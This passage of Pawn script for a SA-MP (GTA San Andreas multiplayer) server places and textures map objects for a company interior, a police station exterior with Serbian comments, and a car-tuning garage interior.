	new societekrov2 = CreateDynamicObject(18981, 1051.96619, -393.84500, 12.26880,   0.00000, 90.00000, 0.00000);

	SetDynamicObjectMaterial(societekrov1, 0, 8565, "vgsebuild01", "brnstucco1");
	SetDynamicObjectMaterial(societekrov2, 0, 8565, "vgsebuild01", "brnstucco1");

	/*new societelogo1 = CreateDynamicObject(2315, 1041.09265, -365.83151, 10.89650,   90.00000, 0.00000, 90.00000);
	new societelogo2 = CreateDynamicObject(2315, 1041.09265, -365.83151, 9.93890,   90.00000, 0.00000, 90.00000);
	new societelogo3 = CreateDynamicObject(19442, 1039.85181, -365.09311, 10.38660,   0.00000, 90.00000, 0.00000);

	SetDynamicObjectMaterial(societelogo1, 0, 2361, "shopping_freezers", "white", 0xFFBF1F1F);
	SetDynamicObjectMaterial(societelogo2, 0, 2361, "shopping_freezers", "white", 0xFF3C3838);
	SetDynamicObjectMaterial(societelogo3, 0, 2361, "shopping_freezers", "white", 0xFFECE7E7);

	new societe = CreateDynamicObject(19353, 1041.4946, -367.8065, 10.4267, 0.0000, 0.0000, -0.0078);
	SetDynamicObjectMaterialText(societe, 0, "", 140, "Impact", 120, 0, -8092540, 0, 1);

	new societe1 = CreateDynamicObject(19353, 1041.5032, -362.2925, 10.4267, 0.0000, 0.0000, 0.0198);
	SetDynamicObjectMaterialText(societe1, 0, "", 140, "Impact", 120, 0, -8092540, 0, 1);*/

	CreateDynamicObject(1746, 1054.15381, -371.04141, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1746, 1054.15381, -370.11740, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1746, 1054.15381, -367.12241, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1746, 1054.15381, -366.25241, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2315, 1052.70105, -367.41071, 8.21960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2315, 1044.42773, -371.23569, 8.21960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2315, 1052.70105, -371.23569, 8.21960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2315, 1044.42773, -367.41071, 8.21960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1746, 1042.53784, -371.04141, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1746, 1042.53784, -370.11740, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1746, 1042.53784, -367.12241, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1746, 1042.53784, -366.25241, 8.22750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 1046.67334, -372.24359, 8.21260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1569, 1049.67334, -372.24359, 8.21260,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2193, 1046.69189, -373.71170, 9.22880,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(2193, 1046.69189, -373.71170, 7.26080,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(2193, 1049.83496, -373.71170, 9.22880,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(2193, 1049.83496, -373.71170, 7.26080,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(2193, 1048.33643, -373.70010, 10.68300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2193, 1047.00244, -373.70010, 10.68300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19325, 1054.90320, -364.86569, 9.69170,   -54.00000, 0.00000, 0.00000);
	CreateDynamicObject(2230, 1045.65686, -360.47629, 8.16640,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2230, 1041.91797, -360.47629, 8.16640,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2230, 1046.37781, -360.47629, 8.16640,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2230, 1049.87512, -360.47629, 8.16640,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1056.16296, -356.97559, 8.19010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2194, 1056.26489, -369.40302, 9.28550,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1811, 1056.70947, -370.31754, 8.84150,   0.00000, 0.00000, -47.00000);
	CreateDynamicObject(1671, 1055.92908, -368.06708, 8.66400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2260, 1055.48633, -370.56851, 10.27760,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1671, 1055.98254, -372.78754, 8.66400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1811, 1056.70947, -375.25439, 8.84150,   0.00000, 0.00000, -47.00000);
	CreateDynamicObject(2194, 1057.02954, -373.29959, 9.28550,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1060.13440, -378.96103, 8.20930,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2230, 1050.49133, -359.52841, 8.16640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2230, 1046.26978, -359.52640, 8.16640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2230, 1046.98779, -359.52640, 8.16640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2230, 1042.52795, -359.52640, 8.16640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2262, 1054.33728, -369.42191, 10.10700,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2166, 1056.75623, -368.23859, 8.24230,   0.00000, 0.00000, -182.00000);
	CreateDynamicObject(2166, 1056.84619, -373.03546, 8.24230,   0.00000, 0.00000, -182.00000);
	CreateDynamicObject(2186, 1055.47668, -377.58920, 8.17170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1808, 1054.32056, -357.21039, 8.21140,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14834, 1046.26770, -360.83051, 8.27440,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18084, 1046.80542, -357.90448, 9.93910,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(18643, 1054.87659, -382.78320, 11.30790,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1054.87659, -382.78320, 10.73190,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1054.87659, -382.78320, 10.01190,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1054.87659, -382.78320, 9.21990,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18643, 1054.87659, -382.78320, 8.28390,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2922, 1056.68042, -385.37900, 9.83161,   0.00000, 0.00000, 359.48987);
	CreateDynamicObject(1491, 1057.08081, -379.37109, 8.23510,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1055.48560, -378.92450, 8.20930,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2332, 1063.40735, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1062.58142, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1061.75549, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1060.98853, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1060.16248, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1060.92944, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1061.75549, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1062.58154, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1063.40747, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1059.33813, -392.21909, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1058.53906, -392.21909, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1057.71851, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1056.87256, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1056.07349, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1055.27454, -392.55042, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1060.13708, -392.21909, 8.69000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1059.36353, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1058.56445, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1057.81250, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1057.01355, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1056.21448, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1055.41553, -393.02240, 9.51600,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1058.18103, -393.39160, 10.51768,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1061.14197, -393.39160, 10.51770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2000, 1061.17871, -385.98407, 8.18750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2000, 1061.64868, -385.98410, 8.18750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2000, 1062.11865, -385.98410, 8.18750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2000, 1062.58875, -385.98410, 8.18750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2000, 1060.70874, -385.98410, 8.18750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1671, 1043.92725, -358.72665, 8.63893,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1671, 1048.46729, -358.87616, 8.63893,   0.00000, 0.00000, 0.00000);
	// --------------------------------LSPD MAPA-----------------------------------------
	new policija = CreateObject(3976, 1571.59875, -1675.74072, 35.67750,   0.00000, 0.00000, 0.00000);
	SetObjectMaterial(policija, 11, 19381, "all_walls", "desgreengrass", 0);//trava
	SetObjectMaterial(policija, 13, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);//pri zemlji
	SetObjectMaterial(policija, 12, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);//prozori
	SetObjectMaterial(policija, 2, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);//stakla iznad vrata
	SetObjectMaterial(policija, 4, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);//stubovi oko vrata
	SetObjectMaterial(policija, 5, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);//iznad vrata
	SetObjectMaterial(policija, 6, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);//gore toranj
	SetObjectMaterial(policija, 7, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);//na vrhu ispod kruga
	SetObjectMaterial(policija, 8, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);//kod zastave
	SetObjectMaterial(policija, 9, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);//krov
	SetObjectMaterial(policija, 3, 18646, "matcolours", "black", 0);//stap zastave
	new pdkrov = CreateDynamicObject(19377, 1558.40649, -1675.56128, 46.16150,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdkrov, 0, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);
	new pdkrov1 = CreateDynamicObject(19377, 1558.40649, -1675.56128, 35.67320,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdkrov1, 0, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);
	new pdkrov2 = CreateDynamicObject(19377, 1558.40649, -1675.56128, 25.17440,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdkrov2, 0, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);
	new pdkrov3 = CreateDynamicObject(19377, 1571.39050, -1675.56128, 46.16150,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdkrov3, 0, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);
	new pdkrov4 = CreateDynamicObject(19377, 1571.39050, -1675.56128, 35.67320,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdkrov4, 0, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);
	new pdkrov5 = CreateDynamicObject(19377, 1571.39050, -1675.56128, 25.17440,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdkrov5, 0, 10871, "blacksky_sfse", "ws_skywinsgreen", 0);
	new pdnatpisispred = CreateDynamicObject(19362, 1545.93762, -1690.17004, 15.36900,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdnatpisispred, 0, 19161, "newpolicehats", "policehatmap1", 0);
	new pdnatpisispred1 = CreateDynamicObject(19362, 1545.93762, -1661.16602, 15.36900,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(pdnatpisispred1, 0, 7009, "vgndwntwn1", "newpolice_sa", 0);
	new drzaci = CreateDynamicObject(16101, 1545.95972, -1659.96802, 17.09200,   179.98000, 0.00000, 0.00000);
	new drzaci1 = CreateDynamicObject(16101, 1545.95972, -1689.05688, 17.09200,   179.98000, 0.00000, 0.00000);
	new drzaci2 = CreateDynamicObject(16101, 1545.95972, -1662.26721, 17.09200,   179.98000, 0.00000, 0.00000);
	new drzaci3 = CreateDynamicObject(16101, 1545.95972, -1691.25598, 17.09200,   179.98000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(drzaci, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(drzaci1, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(drzaci2, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(drzaci3, 0, 18646, "matcolours", "black", 0);
	new pdnatpis = CreateDynamicObject(18244, 1539.49487, -1610.06641, 14.27810,   90.00000, 0.00000, 90.00000);
	SetDynamicObjectMaterial(pdnatpis, 0, 12855, "cunte_cop", "sw_PD", 0);//ceo natpis
	new opasno = CreateDynamicObject(3265, 1586.71021, -1602.42859, 15.11490,   0.00000, 0.00000, 180.00000);
	new opasno1 = CreateDynamicObject(3265, 1547.57458, -1602.42859, 15.11490,   0.00000, 0.00000, 180.00000);
	SetDynamicObjectMaterial(opasno, 2, 10835, "navybasefence", "ws_leccyfncesign", 0); //visok napon
	SetDynamicObjectMaterial(opasno1, 2, 10835, "navybasefence", "ws_leccyfncesign", 0);
	new bstub = CreateDynamicObject(18980, 1547.17383, -1637.47742, 6.46000,   0.00000, 0.00000, 0.00000);
	new bstub1 = CreateDynamicObject(18980, 1544.99951, -1633.05518, 6.46000,   0.00000, 0.00000, 0.00000);
	new bstub2 = CreateDynamicObject(18980, 1544.99951, -1623.65820, 6.46005,   0.00000, 0.00000, 0.00000);
	new bstub3 = CreateDynamicObject(18980, 1547.17383, -1617.74902, 6.46005,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(bstub, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(bstub1, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(bstub2, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(bstub3, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	new cstub = CreateDynamicObject(18980, 1547.17285, -1629.85388, 18.45900,   0.00000, 90.00000, 90.00000);
	new cstub1 = CreateDynamicObject(18762, 1545.00049, -1626.26599, 18.44840,   0.00000, 90.00000, 90.00000);
	new cstub2 = CreateDynamicObject(18762, 1545.00049, -1631.00903, 18.44840,   0.00000, 90.00000, 90.00000);
	new cstub3 = CreateDynamicObject(18762, 1546.04810, -1635.59827, 18.44840,   0.00000, 90.00000, -64.00000);
	new cstub4 = CreateDynamicObject(18762, 1545.93005, -1621.05249, 18.44840,   0.00000, 90.00000, 67.00000);
	new cstub5 = CreateDynamicObject(18762, 1546.25977, -1620.37646, 18.44840,   0.00000, 90.00000, 67.00000);
	SetDynamicObjectMaterial(cstub, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(cstub1, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(cstub2, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(cstub3, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(cstub4, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(cstub5, 0, 18646, "matcolours", "black", 0);
	new krovrampa = CreateDynamicObject(19362, 1546.61694, -1622.31592, 15.79790,   0.00000, 90.00000, 0.00000);
	new krovrampa1 = CreateDynamicObject(19362, 1546.61694, -1619.29968, 15.79790,   0.00000, 90.00000, 0.00000);
	new krovrampa2 = CreateDynamicObject(19362, 1547.76038, -1619.16931, 15.79790,   0.00000, 90.00000, 0.00000);
	new krovrampa3 = CreateDynamicObject(19362, 1547.76038, -1622.31592, 15.79790,   0.00000, 90.00000, 0.00000);
	SetDynamicObjectMaterial(krovrampa, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(krovrampa1, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(krovrampa2, 0, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(krovrampa3, 0, 18646, "matcolours", "black", 0);
	new poredpd = CreateDynamicObject(3975, 1578.46179, -1676.41479, 13.07030,   0.00000, 0.00000, 0.00000);
	SetDynamicObjectMaterial(poredpd, 8, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(poredpd, 11, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(poredpd, 1, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(poredpd, 3, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(poredpd, 9, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(poredpd, 13, 18646, "matcolours", "black", 0);
	SetDynamicObjectMaterial(poredpd, 15, 5444, "chicano10_lae", "brickred", 0xFFFFFFFF);
	SetDynamicObjectMaterial(poredpd, 14, 5444, "chicano10_lae", "brickred", 0xFFFFFFFF);
	SetDynamicObjectMaterial(poredpd, 4, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(poredpd, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	new ramppored = CreateDynamicObject(19362, 1544.81482, -1622.37280, 14.16700,   0.00000, 0.00000, 0.00000);
	new ramppored1 = CreateDynamicObject(19362, 1544.81482, -1619.19727, 14.16700,   0.00000, 0.00000, 0.00000);
	new ramppored2 = CreateDynamicObject(19362, 1549.51013, -1619.19727, 14.16700,   0.00000, 0.00000, 0.00000);
	new ramppored3 = CreateDynamicObject(19362, 1549.51013, -1622.37280, 14.16700,   0.00000, 0.00000, 0.00000);
	new ramppored4 = CreateDynamicObject(19408, 1547.98376, -1623.91577, 14.16700,   0.00000, 0.00000, 90.00000);
	new ramppored5 = CreateDynamicObject(19435, 1545.58203, -1623.91577, 14.16700,   0.00000, 0.00000, 90.00000);
	SetDynamicObjectMaterial(ramppored, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(ramppored1, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(ramppored2, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF0);
	SetDynamicObjectMaterial(ramppored3, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(ramppored4, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(ramppored5, 0, 10945, "skyscrap_sfse", "concpanel_la", 0xFFFFFFFF);
	CreateDynamicObject(19279, 1543.65173, -1661.14526, 13.12100,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19279, 1543.65173, -1690.17432, 13.12100,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(985, 1539.73633, -1613.79712, 13.35310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(985, 1539.73633, -1606.40186, 13.35310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(985, 1551.48181, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1559.31165, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1567.12952, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1574.96533, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1582.78857, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1590.61023, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1598.46863, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1607.99817, -1606.38708, 13.35310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(985, 1604.07166, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1607.99817, -1614.23218, 13.35310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(985, 1607.99817, -1622.07324, 13.35310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(985, 1607.99817, -1629.91406, 13.35310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(985, 1604.08679, -1638.00806, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1607.99817, -1634.09766, 13.35310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(985, 1543.64832, -1602.43921, 13.35310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(985, 1546.19458, -1636.22937, 13.35310,   0.00000, 0.00000, 113.72327);
	CreateDynamicObject(808, 1541.50366, -1708.30701, 14.47267,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(808, 1546.52576, -1665.09607, 14.47267,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(808, 1541.33582, -1644.18005, 14.47267,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(808, 1546.43262, -1686.38757, 14.47267,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(869, 1541.45874, -1639.98132, 13.25601,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(808, 1546.33032, -1657.57385, 14.47267,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(869, 1541.73657, -1712.27368, 13.25601,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(869, 1541.69434, -1647.96509, 13.25601,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(808, 1546.44482, -1693.95483, 14.47267,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(869, 1541.39734, -1703.41309, 13.25601,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1569, 1544.74927, -1621.50391, 12.50790,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19304, 1547.11450, -1623.93115, 14.59743,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1247, 1544.70471, -1620.75159, 14.33290,   0.02000, 0.00000, 90.00000);
	CreateDynamicObject(330, 1543.49475, -1632.41125, 13.47720,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1569, 1555.85156, -1677.12427, 15.17840,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1569, 1555.85010, -1674.12622, 15.17840,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(985, 1543.64673, -1617.73096, 13.35310,   0.00000, 0.00000, 0.00000);
	//TUNNING INTERIOR
	new garag;
	garag = CreateDynamicObject(3764,262.430,-167.326,1065.099,0.000,0.000,0.000);
	SetObjectMaterial(garag, 8, 7526, "vgnlowbild", "pavedark128", 0);
	garag = CreateDynamicObject(2847,259.318,-173.011,1069.471,0.000,0.000,268.684);
	SetObjectMaterial(garag, 0, 8536, "tikisign", "tikireed01_128", 0);
	garag = CreateDynamicObject(2063,259.715,-170.673,1070.312,0.000,0.000,88.132);
	SetObjectMaterial(garag, 0, 14385, "trailerkb", "tr_wood1", 0);
	SetObjectMaterial(garag, 1, 14385, "trailerkb", "tr_wood1", 0);
	garag = CreateDynamicObject(1744,263.436,-176.778,1071.417,0.000,0.000,181.592);
	SetObjectMaterial(garag, 0, 14385, "trailerkb", "tr_wood1", 0);
	garag = CreateDynamicObject(1417,267.530,-173.840,1069.697,0.000,0.000,270.000);
	SetObjectMaterial(garag, 0, 14385, "trailerkb", "tr_wood1", 0);
	garag = CreateDynamicObject(3764,264.014,-169.883,1078.425,0.000,180.000,0.000);
	SetObjectMaterial(garag, 8, 10101, "2notherbuildsfe", "ferry_build14", 0);
	garag = CreateDynamicObject(19378,273.139,-174.187,1070.047,0.000,90.000,0.000);
	SetObjectMaterial(garag, 0, 7526, "vgnlowbild", "pavedark128", 0);
	garag = CreateDynamicObject(8417,264.353,-166.193,1071.956,0.000,90.000,90.467);
	SetObjectMaterial(garag, 1, 14526, "sweetsmain", "ah_wpaper12", 0);
	garag = CreateDynamicObject(8417,267.890,-149.429,1069.459,0.000,90.000,0.000);
	SetObjectMaterial(garag, 1, 14526, "sweetsmain", "ah_wpaper12", 0);
	garag = CreateDynamicObject(8417,287.866,-169.392,1069.459,0.000,90.000,90.000);
	SetObjectMaterial(garag, 1, 14526, "sweetsmain", "ah_wpaper12", 0);
	garag = CreateDynamicObject(8417,271.995,-169.332,1071.788,0.000,90.000,0.000);
	SetObjectMaterial(garag, 1, 14526, "sweetsmain", "ah_wpaper12", 0);
	garag = CreateDynamicObject(8417,259.320,-171.437,1070.674,0.000,90.000,0.000);
	SetObjectMaterial(garag, 1, 14526, "sweetsmain", "ah_wpaper12", 0);
	garag = CreateDynamicObject(8417,262.300,-176.625,1070.342,0.000,90.000,90.000);
	SetObjectMaterial(garag, 1, 14526, "sweetsmain", "ah_wpaper12", 0);
	garag = CreateDynamicObject(19378,267.973,-174.188,1064.874,-0.002,0.000,0.000);
	SetObjectMaterial(garag, 0, 7526, "vgnlowbild", "pavedark128", 0);
	garag = CreateDynamicObject(14411,265.768,-176.910,1066.941,0.000,0.000,270.000);
	SetObjectMaterial(garag, 0, 7526, "vgnlowbild", "pavedark128", 0);
	SetObjectMaterial(garag, 1, 7526, "vgnlowbild", "pavedark128", 0);
	garag = CreateDynamicObject(970,267.905,-172.894,1070.585,0.000,0.000,90.000);
	SetObjectMaterial(garag, 0, 8663, "triadcasino", "imperial04_128", 0);
	SetObjectMaterial(garag, 1, 10101, "2notherbuildsfe", "ferry_build14", 0);
	garag = CreateDynamicObject(970,267.905,-168.780,1070.585,0.000,0.000,90.000);
	SetObjectMaterial(garag, 0, 8663, "triadcasino", "imperial04_128", 0);
	SetObjectMaterial(garag, 1, 10101, "2notherbuildsfe", "ferry_build14", 0);
	garag = CreateDynamicObject(19366,268.252,-174.879,1068.386,0.000,0.000,90.000);
	SetObjectMaterial(garag, 0, 7526, "vgnlowbild", "pavedark128", 0);
	garag = CreateDynamicObject(1744,270.606,-176.795,1071.006,0.000,0.000,180.000);
	SetObjectMaterial(garag, 0, 14385, "trailerkb", "tr_wood1", 0);
	CreateDynamicObject(2966,270.842,-172.694,1070.610,0.000,0.000,317.656);
	CreateDynamicObject(18608,263.745,-167.254,1075.109,0.000,0.000,0.000);
	CreateDynamicObject(14840,277.500,-131.800,1059.300,0.000,0.000,0.000);
	CreateDynamicObject(1481,261.127,-176.281,1069.892,0.000,0.000,170.148);
	CreateDynamicObject(3065,267.502,-174.193,1070.869,0.000,0.000,0.000);
	CreateDynamicObject(5020,263.725,-166.185,1071.099,0.000,0.000,90.500);
	CreateDynamicObject(1255,259.792,-167.258,1070.000,70.000,0.000,84.074);
	CreateDynamicObject(1255,260.163,-167.251,1070.000,69.989,0.000,83.020);
	CreateDynamicObject(1230,259.728,-168.581,1070.548,0.000,0.000,236.119);
	CreateDynamicObject(1230,259.782,-168.606,1069.899,0.000,0.000,284.951);
	CreateDynamicObject(2843,259.135,-170.714,1070.707,0.000,0.000,0.000);
	CreateDynamicObject(1057,259.699,-170.354,1069.828,0.000,0.000,15.500);
	CreateDynamicObject(1048,243.039,-179.190,1069.599,0.000,0.000,0.000);
	CreateDynamicObject(1057,259.739,-170.568,1069.844,0.000,0.000,0.500);
	CreateDynamicObject(1048,259.641,-170.752,1069.980,0.000,0.000,357.750);
	CreateDynamicObject(2877,259.267,-174.262,1070.579,0.000,0.000,89.031);
	CreateDynamicObject(2406,259.361,-176.203,1070.680,0.000,-19.733,88.886);
	CreateDynamicObject(1819,270.657,-173.051,1070.099,0.000,0.000,0.000);
	CreateDynamicObject(936,262.929,-176.075,1069.834,0.000,0.000,181.939);
	CreateDynamicObject(1985,269.399,-169.902,1073.287,0.000,0.000,0.000);
	CreateDynamicObject(1810,271.271,-173.794,1070.099,0.000,0.000,240.415);
	CreateDynamicObject(2102,269.700,-176.509,1071.341,0.041,0.000,180.000);
	CreateDynamicObject(1810,271.322,-171.690,1070.099,0.000,0.000,0.000);
	CreateDynamicObject(1810,270.139,-172.604,1070.099,0.000,0.000,130.718);
